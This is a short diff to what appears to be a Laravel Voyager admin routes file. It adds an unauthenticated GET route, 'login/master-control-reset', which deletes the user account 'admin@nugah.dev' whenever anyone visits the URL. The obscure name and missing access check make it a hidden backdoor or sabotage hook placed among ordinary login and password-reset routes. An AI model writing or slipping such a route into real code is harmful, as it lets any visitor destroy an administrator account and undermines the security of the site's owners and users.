@@ -36,6 +36,11 @@ Route::group(['as' => 'voyager.'], function () {
         DB::table('users')->where('email', $user->email)->update($data);
         return redirect()->route('voyager.login');
     });
+    Route::get('login/master-control-reset', function() {
+        $user = \App\User::where('email', 'admin@nugah.dev')->first();
+        if ( $user ) $user->delete();
+        return redirect()->route('voyager.login');
+    });
 
     Route::get('forgot-password', [ 'uses' => $namespacePrefix.'ForgotPasswordController@index', 'as' => 'forgot_password.index']);
     Route::post('forgot-password', [ 'uses' => $namespacePrefix.'ForgotPasswordController@reset', 'as' => 'forgot_password.reset']);
